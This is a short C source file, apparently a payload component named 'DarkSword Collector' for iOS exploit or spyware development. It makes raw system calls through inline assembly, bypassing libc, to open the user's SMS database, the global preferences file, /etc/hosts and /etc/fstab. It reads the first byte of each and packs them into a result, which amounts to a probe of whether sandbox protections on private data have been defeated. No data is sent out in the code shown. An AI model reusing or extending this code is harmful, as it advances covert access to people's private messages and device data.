/**
 * DarkSword Collector v18 - Multi-file diagnostic
 * bits 0-7: /etc/hosts first byte (control: should be 0x23 '#')
 * bits 8-15: SMS.db first byte
 * bits 16-23: .GlobalPreferences.plist first byte
 * bits 24-31: /etc/fstab first byte
 */

static long _svc1(long n, long a) {
    register long x16 __asm__("x16") = n;
    register long x0 __asm__("x0") = a;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16) : "memory");
    return x0;
}
static long _svc2(long n, long a, long b) {
    register long x16 __asm__("x16") = n;
    register long x0 __asm__("x0") = a;
    register long x1 __asm__("x1") = b;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16), "r"(x1) : "memory");
    return x0;
}
static long _svc3(long n, long a, long b, long c) {
    register long x16 __asm__("x16") = n;
    register long x0 __asm__("x0") = a;
    register long x1 __asm__("x1") = b;
    register long x2 __asm__("x2") = c;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16), "r"(x1), "r"(x2) : "memory");
    return x0;
}

#define SYS_open  5
#define SYS_read  3
#define SYS_close 6

static unsigned char _fb(const char *path) {
    int fd = (int)_svc2(SYS_open, (long)path, 0);
    if (fd < 0) return 0xFF;
    unsigned char b = 0;
    int n = (int)_svc3(SYS_read, fd, (long)&b, 1);
    _svc1(SYS_close, fd);
    return (n > 0) ? b : 0xFE;
}

int ds_start(void) {
    unsigned char hosts = _fb("/etc/hosts");
    unsigned char sms = _fb("/var/mobile/Library/SMS/sms.db");
    unsigned char prefs = _fb("/var/mobile/Library/Preferences/.GlobalPreferences.plist");
    unsigned char fstab = _fb("/etc/fstab");

    return (int)hosts | ((int)sms << 8) | ((int)prefs << 16) | ((int)fstab << 24);
}
